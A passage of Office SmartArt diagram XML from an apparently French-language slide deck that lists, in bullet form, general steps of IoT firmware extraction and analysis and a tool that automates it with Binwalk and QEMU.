    <dgm:cxn modelId="{F4CD3820-B849-4E90-81DF-7AA95F8A78E4}" srcId="{0380F991-9FD5-42FF-8C5E-A47932F66B53}" destId="{9E092E8B-4D34-4ED9-97FA-38441B796127}" srcOrd="0" destOrd="0" parTransId="{13808E3A-88BD-4C6E-839F-19500FDD3185}" sibTransId="{6DDC8EB8-B4D5-45A9-AFED-4BD270E8B9EB}"/>
    <dgm:cxn modelId="{621FBB28-3737-479A-B440-DC693D0B9ECC}" srcId="{4446B9A8-7B31-4022-80FF-000CD8820477}" destId="{0380F991-9FD5-42FF-8C5E-A47932F66B53}" srcOrd="1" destOrd="0" parTransId="{1D9F29D7-8507-4F75-B991-5A5327977A20}" sibTransId="{1BEF1895-9467-44E4-955A-D248498D040D}"/>
    <dgm:cxn modelId="{E199B329-A634-8D48-8DFE-BED59693892A}" type="presOf" srcId="{963DAF5C-E703-4A02-873D-7D501DA13142}" destId="{298D9FC1-AE96-494D-AA9A-16ADE6607B4C}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{91C3172B-0402-214F-9B5F-948A4330D446}" type="presOf" srcId="{70236DFE-F8A9-4D98-A79A-E9F940EC0423}" destId="{298D9FC1-AE96-494D-AA9A-16ADE6607B4C}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{31910C2C-E5A3-4658-933A-394BB727A28E}" srcId="{4446B9A8-7B31-4022-80FF-000CD8820477}" destId="{5B670F59-BDF3-4CEA-BEFA-8763CD62DC81}" srcOrd="0" destOrd="0" parTransId="{7657B3EC-16B4-4FF4-B629-AE5AD4D20247}" sibTransId="{74D91943-AF5B-419B-A911-B8FF135A5BDB}"/>
    <dgm:cxn modelId="{946C40C5-EF86-4A4F-97FF-9B84D503F935}" type="presOf" srcId="{0380F991-9FD5-42FF-8C5E-A47932F66B53}" destId="{3DA1143D-6554-FB46-9D75-F938AF2E9CF1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{691F31C8-5501-4B41-A647-BE7E267BF264}" type="presOf" srcId="{5B670F59-BDF3-4CEA-BEFA-8763CD62DC81}" destId="{0B5F7979-6AA6-3644-8E03-2379BA9ADEAA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{9EEE90C8-7D3C-CD4D-B950-ED25779DCC79}" type="presOf" srcId="{4446B9A8-7B31-4022-80FF-000CD8820477}" destId="{37E8F1F9-7067-174E-9C22-8AFDFC54B264}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{923FCBD6-D744-4916-8A5D-1217180E7280}" srcId="{0380F991-9FD5-42FF-8C5E-A47932F66B53}" destId="{70236DFE-F8A9-4D98-A79A-E9F940EC0423}" srcOrd="1" destOrd="0" parTransId="{2D534E30-AC17-4717-A17B-E3D36CC283C1}" sibTransId="{0BBBCEC4-1279-44F5-9F5D-D3003C1EA7AC}"/>
    <dgm:cxn modelId="{4FF0A20A-AB93-0D48-9589-58ABB19A82E0}" type="presParOf" srcId="{37E8F1F9-7067-174E-9C22-8AFDFC54B264}" destId="{0B5F7979-6AA6-3644-8E03-2379BA9ADEAA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{4D8C038B-4EE4-5446-B745-3721D0897240}" type="presParOf" srcId="{37E8F1F9-7067-174E-9C22-8AFDFC54B264}" destId="{9481F344-F3A9-8649-92D2-28158633FCE0}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{90547C0E-BBA8-1142-BF25-8825F25DCF43}" type="presParOf" srcId="{37E8F1F9-7067-174E-9C22-8AFDFC54B264}" destId="{3DA1143D-6554-FB46-9D75-F938AF2E9CF1}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{9D077E73-EFB3-1043-B37D-60882157B315}" type="presParOf" srcId="{37E8F1F9-7067-174E-9C22-8AFDFC54B264}" destId="{298D9FC1-AE96-494D-AA9A-16ADE6607B4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D927F7E0-DCCC-4A8E-B6FD-00A20B540F46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12D9322-61B4-40C6-BAEB-27F9158BD0F3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Extraction du firmware</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3AC15EF9-942E-4DFD-BBC0-CABE880E183D}" type="parTrans" cxnId="{C1F88DA5-DFF8-4C70-9741-F0C19E71A463}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C51BFC08-D09F-41F0-A8C5-70B33067996D}" type="sibTrans" cxnId="{C1F88DA5-DFF8-4C70-9741-F0C19E71A463}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DA7161EF-F0A9-412A-85A8-EBC5BFF5F091}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Directement depuis l’appareil.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4FAF13B2-2601-4C20-87A6-BA474424FCCD}" type="parTrans" cxnId="{53DA6A55-C21F-47A7-AAAF-731B58757FDC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FCE6C360-781E-475E-A7C1-4296927197D8}" type="sibTrans" cxnId="{53DA6A55-C21F-47A7-AAAF-731B58757FDC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{622D35C2-9F83-4DEE-ABA1-09F002E0EDA4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Téléchargement depuis le site du fabricant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9325519C-1904-4CC2-9F83-BEE9EADF89E6}" type="parTrans" cxnId="{35A38E0B-B35B-4948-81A8-351973755CCB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{93585E18-3D1E-4A90-96E9-82A0733CA0B2}" type="sibTrans" cxnId="{35A38E0B-B35B-4948-81A8-351973755CCB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2D051916-8A59-46A5-A678-D54FFDA43E2D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Sniffing des mises à jour OTA (Over-The-Air).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6ECEAA39-8383-447E-AB44-7B2D03BF2605}" type="parTrans" cxnId="{67FBA76F-6944-4F75-938C-239E50B16725}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C78D37FA-E2DE-456C-860B-2045EEE29DC8}" type="sibTrans" cxnId="{67FBA76F-6944-4F75-938C-239E50B16725}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Décomposition et analyse</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{16958EE8-1ABD-4B7A-A3D8-1C55B9F4B011}" type="parTrans" cxnId="{7941002E-0DFA-4C77-8272-9E59FD460C9C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{22476C86-D657-454E-B3C9-0D906377A06C}" type="sibTrans" cxnId="{7941002E-0DFA-4C77-8272-9E59FD460C9C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3E528634-5C7D-4A0C-8837-C969D112727C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Identifier les systèmes de fichiers et structures internes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6C7C4F1C-7699-43F3-BFA4-683F4AFD3F4E}" type="parTrans" cxnId="{59584119-8C29-42D5-A03C-2DA6D2A45379}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8584CAA0-DB26-40D0-9B44-C117F8E91B47}" type="sibTrans" cxnId="{59584119-8C29-42D5-A03C-2DA6D2A45379}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{96CFA940-0F52-4A82-89C3-75D46FFB6865}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Désassembler ou décompiler les binaires.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{071417D9-7E27-4140-941B-50B8339A586A}" type="parTrans" cxnId="{AE583B69-D14E-4BC2-A55C-1DBCE189A579}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C7A84BBF-AE9F-4AD4-8746-B852A82BFCCE}" type="sibTrans" cxnId="{AE583B69-D14E-4BC2-A55C-1DBCE189A579}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" type="pres">
      <dgm:prSet presAssocID="{D927F7E0-DCCC-4A8E-B6FD-00A20B540F46}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{54F4E911-AD28-4347-94B5-4D9A7666A125}" type="pres">
      <dgm:prSet presAssocID="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7791CC1A-44CC-9C43-BC16-CA26480E796F}" type="pres">
      <dgm:prSet presAssocID="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{85C8A65F-8E0F-BE42-A330-A82B2FD20670}" type="pres">
      <dgm:prSet presAssocID="{012D9322-61B4-40C6-BAEB-27F9158BD0F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AE28E5B-4A53-144D-B2F6-34B8C85EF5F0}" type="pres">
      <dgm:prSet presAssocID="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C5A20066-D0F0-BD4C-9C19-60124269A760}" type="pres">
      <dgm:prSet presAssocID="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{09F241E1-D0F5-414F-821F-BF64E2D45CEA}" type="pres">
      <dgm:prSet presAssocID="{C51BFC08-D09F-41F0-A8C5-70B33067996D}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FA961398-266F-8B4D-9217-D932B5D479F7}" type="pres">
      <dgm:prSet presAssocID="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{26401A96-CF21-7E4C-B6ED-4857D7A4EB41}" type="pres">
      <dgm:prSet presAssocID="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3D63D699-F235-2F49-97E6-8100ADC71220}" type="pres">
      <dgm:prSet presAssocID="{6D273AD3-0C82-4DDA-9817-D6FF58268B0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4088319-D45C-8B46-B010-DC4AE716726D}" type="pres">
      <dgm:prSet presAssocID="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BCD0411C-5FDC-A04E-93F8-56047C280275}" type="pres">
      <dgm:prSet presAssocID="{6D273AD3-0C82-4DDA-9817-D6FF58268B0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5A38E0B-B35B-4948-81A8-351973755CCB}" srcId="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" destId="{622D35C2-9F83-4DEE-ABA1-09F002E0EDA4}" srcOrd="1" destOrd="0" parTransId="{9325519C-1904-4CC2-9F83-BEE9EADF89E6}" sibTransId="{93585E18-3D1E-4A90-96E9-82A0733CA0B2}"/>
    <dgm:cxn modelId="{AE1E1C11-3A40-4B46-86DC-3B2C0BB77615}" type="presOf" srcId="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" destId="{3D63D699-F235-2F49-97E6-8100ADC71220}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5D77F213-E9B4-4946-AF68-6090590D4E7B}" type="presOf" srcId="{622D35C2-9F83-4DEE-ABA1-09F002E0EDA4}" destId="{C5A20066-D0F0-BD4C-9C19-60124269A760}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{59584119-8C29-42D5-A03C-2DA6D2A45379}" srcId="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" destId="{3E528634-5C7D-4A0C-8837-C969D112727C}" srcOrd="0" destOrd="0" parTransId="{6C7C4F1C-7699-43F3-BFA4-683F4AFD3F4E}" sibTransId="{8584CAA0-DB26-40D0-9B44-C117F8E91B47}"/>
    <dgm:cxn modelId="{94BEA328-DDF6-F54E-810C-62A0003E2406}" type="presOf" srcId="{D927F7E0-DCCC-4A8E-B6FD-00A20B540F46}" destId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7941002E-0DFA-4C77-8272-9E59FD460C9C}" srcId="{D927F7E0-DCCC-4A8E-B6FD-00A20B540F46}" destId="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" srcOrd="1" destOrd="0" parTransId="{16958EE8-1ABD-4B7A-A3D8-1C55B9F4B011}" sibTransId="{22476C86-D657-454E-B3C9-0D906377A06C}"/>
    <dgm:cxn modelId="{53DA6A55-C21F-47A7-AAAF-731B58757FDC}" srcId="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" destId="{DA7161EF-F0A9-412A-85A8-EBC5BFF5F091}" srcOrd="0" destOrd="0" parTransId="{4FAF13B2-2601-4C20-87A6-BA474424FCCD}" sibTransId="{FCE6C360-781E-475E-A7C1-4296927197D8}"/>
    <dgm:cxn modelId="{AE583B69-D14E-4BC2-A55C-1DBCE189A579}" srcId="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" destId="{96CFA940-0F52-4A82-89C3-75D46FFB6865}" srcOrd="1" destOrd="0" parTransId="{071417D9-7E27-4140-941B-50B8339A586A}" sibTransId="{C7A84BBF-AE9F-4AD4-8746-B852A82BFCCE}"/>
    <dgm:cxn modelId="{67FBA76F-6944-4F75-938C-239E50B16725}" srcId="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" destId="{2D051916-8A59-46A5-A678-D54FFDA43E2D}" srcOrd="2" destOrd="0" parTransId="{6ECEAA39-8383-447E-AB44-7B2D03BF2605}" sibTransId="{C78D37FA-E2DE-456C-860B-2045EEE29DC8}"/>
    <dgm:cxn modelId="{1E054778-64F3-F54D-986F-2BCA5079F1A5}" type="presOf" srcId="{3E528634-5C7D-4A0C-8837-C969D112727C}" destId="{BCD0411C-5FDC-A04E-93F8-56047C280275}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{FB7E5C85-CA2A-DC49-AD69-71FB36B3CF47}" type="presOf" srcId="{96CFA940-0F52-4A82-89C3-75D46FFB6865}" destId="{BCD0411C-5FDC-A04E-93F8-56047C280275}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{342BA09B-BB7F-4C4F-A1F6-A3D04370773F}" type="presOf" srcId="{2D051916-8A59-46A5-A678-D54FFDA43E2D}" destId="{C5A20066-D0F0-BD4C-9C19-60124269A760}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C1F88DA5-DFF8-4C70-9741-F0C19E71A463}" srcId="{D927F7E0-DCCC-4A8E-B6FD-00A20B540F46}" destId="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" srcOrd="0" destOrd="0" parTransId="{3AC15EF9-942E-4DFD-BBC0-CABE880E183D}" sibTransId="{C51BFC08-D09F-41F0-A8C5-70B33067996D}"/>
    <dgm:cxn modelId="{C55CCEBD-3812-2142-913B-DAE3C953F4B0}" type="presOf" srcId="{DA7161EF-F0A9-412A-85A8-EBC5BFF5F091}" destId="{C5A20066-D0F0-BD4C-9C19-60124269A760}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{62C156C2-C524-CF43-872E-4CBCE655DAED}" type="presOf" srcId="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" destId="{85C8A65F-8E0F-BE42-A330-A82B2FD20670}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{30947AC9-1F53-2C47-872B-CA81B6DA6D7A}" type="presOf" srcId="{6D273AD3-0C82-4DDA-9817-D6FF58268B05}" destId="{26401A96-CF21-7E4C-B6ED-4857D7A4EB41}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{98E783CD-6147-F04D-9C9F-B3E99C9DF8F1}" type="presOf" srcId="{012D9322-61B4-40C6-BAEB-27F9158BD0F3}" destId="{7791CC1A-44CC-9C43-BC16-CA26480E796F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F488B48B-4D5A-B048-AC63-E97FEDD8C861}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{54F4E911-AD28-4347-94B5-4D9A7666A125}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{467C6F59-18D0-1040-8C70-9BE384A064A2}" type="presParOf" srcId="{54F4E911-AD28-4347-94B5-4D9A7666A125}" destId="{7791CC1A-44CC-9C43-BC16-CA26480E796F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DDF3B2B6-E955-B444-B388-3F191DAF8A27}" type="presParOf" srcId="{54F4E911-AD28-4347-94B5-4D9A7666A125}" destId="{85C8A65F-8E0F-BE42-A330-A82B2FD20670}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{60BD6EA6-A89C-C34A-89CE-2E2B352344CF}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{2AE28E5B-4A53-144D-B2F6-34B8C85EF5F0}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{3919F09A-C203-EF47-B267-8C9392A664EA}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{C5A20066-D0F0-BD4C-9C19-60124269A760}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F9D56998-B679-D34D-986D-2D14BC00DB44}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{09F241E1-D0F5-414F-821F-BF64E2D45CEA}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DFE5C2A6-077E-C840-9C93-000F750C6BE7}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{FA961398-266F-8B4D-9217-D932B5D479F7}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9FFE74D8-585B-1B43-9C02-59753BC224CF}" type="presParOf" srcId="{FA961398-266F-8B4D-9217-D932B5D479F7}" destId="{26401A96-CF21-7E4C-B6ED-4857D7A4EB41}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7E581812-6CE1-AE40-A170-D9F01F468D45}" type="presParOf" srcId="{FA961398-266F-8B4D-9217-D932B5D479F7}" destId="{3D63D699-F235-2F49-97E6-8100ADC71220}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{17E19BC6-133C-8B45-974C-56721EFC035F}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{64088319-D45C-8B46-B010-DC4AE716726D}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4CA36C84-5F0E-5E45-8ACD-07814B79D14E}" type="presParOf" srcId="{851183C0-9CB0-D44F-B74D-E59DEC2192EF}" destId="{BCD0411C-5FDC-A04E-93F8-56047C28027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1940A75-C6CC-4588-89AA-F2B5F21EF20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0DA32E-7A45-4193-A660-D2A32EC1FEAD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>C’est quoi ? </a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DBFEFDF5-65A5-410A-B6F2-6520CE6804D9}" type="parTrans" cxnId="{8AA22C70-478F-43D8-B9CC-230022B4BCF1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{ACF096D1-78EF-4CCA-BC91-B777409C0D17}" type="sibTrans" cxnId="{8AA22C70-478F-43D8-B9CC-230022B4BCF1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B2A388F6-67EF-4B68-B8B5-E976FE3BAAE2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Outil conçu pour automatiser l'analyse des firmwares IoT.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{247C8559-415B-4A57-93BD-BC5223BA48D0}" type="parTrans" cxnId="{6E15FDB7-F830-49C0-A6A5-E13E5EEE8DCD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A0B0596F-1AD3-4C37-ADEB-8E0229AE001F}" type="sibTrans" cxnId="{6E15FDB7-F830-49C0-A6A5-E13E5EEE8DCD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D11E5E23-C3BA-4524-B57B-66BB8ADD76C4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Combine plusieurs outils comme Binwalk, QEMU, et d'autres scripts personnalisés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{439201AA-3A3A-46BB-A058-16C1FFF24850}" type="parTrans" cxnId="{2579466D-0B90-497D-A4C9-9C1A8B2A5199}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9DD595D5-6FDD-40F8-B167-0001352D585F}" type="sibTrans" cxnId="{2579466D-0B90-497D-A4C9-9C1A8B2A5199}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{092A4DC0-B4A0-4E5B-B1AB-9E02D7821EFB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Objectif :Rendre l’analyse des firmwares plus rapide et accessible.</a:t>
          </a:r>
